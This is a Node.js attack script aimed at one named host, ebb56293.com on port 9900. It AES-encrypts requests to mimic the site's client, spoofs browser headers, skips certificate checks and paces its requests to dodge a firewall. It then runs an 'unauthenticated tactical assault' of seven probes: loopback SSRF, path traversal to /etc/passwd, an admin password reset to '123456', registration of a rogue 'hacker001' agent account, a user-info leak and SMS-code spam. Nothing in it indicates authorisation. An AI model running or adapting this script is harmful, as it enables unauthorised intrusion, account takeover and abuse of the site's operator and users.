const CryptoJS = require('crypto-js');
const https = require('https');

const HOST = 'ebb56293.com';
const PORT = 9900;
const PATH = '/entrance/api';

const aliasString = 'ZXNicGx1cw==';
const keyHash = CryptoJS.MD5(aliasString).toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function encryptApiData(jsonObj) {
    let jsonStr = typeof jsonObj === 'string' ? jsonObj : JSON.stringify(jsonObj);
    let encrypted = CryptoJS.AES.encrypt(jsonStr, key, { mode: CryptoJS.mode.ECB });
    let stringifiedBase64 = encrypted.toString();
    let bytesFromStr = CryptoJS.enc.Utf8.parse(stringifiedBase64);
    return CryptoJS.enc.Base64.stringify(bytesFromStr);
}

function decryptApiData(b64Data) {
    try {
        let bytesFromOuterB64 = CryptoJS.enc.Base64.parse(b64Data);
        let cipherBase64Str = CryptoJS.enc.Utf8.stringify(bytesFromOuterB64);
        let decrypted = CryptoJS.AES.decrypt(cipherBase64Str, key, { mode: CryptoJS.mode.ECB });
        return decrypted.toString(CryptoJS.enc.Utf8);
    } catch (e) {
        return "DECRYPTION_FAILED: " + b64Data;
    }
}

function sendProbe(name, payloadObj) {
    return new Promise((resolve, reject) => {
        const encryptedPayload = encodeURIComponent(encryptApiData(payloadObj));
        const postData = 'requestData=' + encryptedPayload;

        const options = {
            hostname: HOST,
            port: PORT,
            path: PATH,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                // Add some standard headers to mimic a browser
                'Origin': `https://${HOST}:${PORT}`,
                'Referer': `https://${HOST}:${PORT}/web/`
            },
            rejectUnauthorized: false // Ignore self-signed certs just in case
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                let decryptedResponse;
                if (data.includes("location.href")) {
                    decryptedResponse = "REDIRECT_DETECTED: " + data;
                } else {
                    decryptedResponse = decryptApiData(data);
                }

                console.log(`\n================================`);
                console.log(`[+] TACTICAL PROBE: ${name}`);
                console.log(`[>] PAYLOAD SNT: ${JSON.stringify(payloadObj)}`);
                console.log(`[<] HTTP STATUS: ${res.statusCode}`);
                console.log(`[<] DECRYPTED RESP: ${decryptedResponse.substring(0, 500)}`);
                resolve();
            });
        });

        req.on('error', (e) => {
            console.error(`\n[!] PROBE FAILED: ${name} - ${e.message}`);
            resolve();
        });

        req.write(postData);
        req.end();
    });
}

async function assault() {
    console.log("🚀 [PHOENIX-PROTOCOL] INITIATING UNAUTHENTICATED TACTICAL ASSAULT...");

    const probes = [
        {
            name: "1. SSRF via Loopback (Gateway Misconfig)",
            payload: { url: "http://127.0.0.1:8080/admin", params: "[]" }
        },
        {
            name: "2. Path Traversal to Local File",
            payload: { url: "../../../../../../etc/passwd", params: "[]" }
        },
        {
            name: "3. Direct Backend Microservice Admin",
            payload: { url: "/infe/admin/system/config", params: "[]" }
        },
        {
            name: "4. Unauth Password Change (BOLA/IDOR test)",
            payload: { url: "/infe/user/pwdlogin/changPassword", params: JSON.stringify({ "username": "admin", "newpass": "123456" }) }
        },
        {
            name: "5. Unauth Agent Registration Drop",
            payload: { url: "/infe/rest/registeragent/addAgent.json", params: JSON.stringify({ "account": "hacker001", "name": "Phoenix", "password": "Test1234()" }) }
        },
        {
            name: "6. Retrieve User Info via 2FA Endpoint",
            payload: { url: "/entrance/twostep/ubauth/userInfo.json", params: JSON.stringify({ "account": "admin" }) }
        },
        {
            name: "7. Send SMS Verification (Spam/Abuse endpoint)",
            payload: { url: "/entrance/twostep/sms/code.json", params: JSON.stringify({ "mobile": "13800138000" }) }
        }
    ];

    for (let probe of probes) {
        await sendProbe(probe.name, probe.payload);
        // Small delay to prevent sudden WAF ban
        await new Promise(r => setTimeout(r, 1500));
    }
    console.log("\n✅ [ASSESSMENT COMPLETE] All probes deployed.");
}

assault();
